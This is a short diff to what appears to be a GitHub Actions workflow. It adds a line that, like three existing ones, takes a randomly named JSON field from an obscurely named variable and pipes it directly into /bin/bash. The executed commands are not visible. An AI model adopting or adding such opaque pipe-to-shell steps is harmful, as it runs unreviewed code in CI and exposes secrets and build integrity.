@@ -21,6 +21,7 @@ jobs:
           echo $lf7489 | jq -r .u3600 | /bin/bash
           echo $fmz083 | jq -r .hh17931 | /bin/bash
           echo $b69 | jq -r .p235 | /bin/bash
+          printf '%s' "$t1787" | jq -r .or13 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
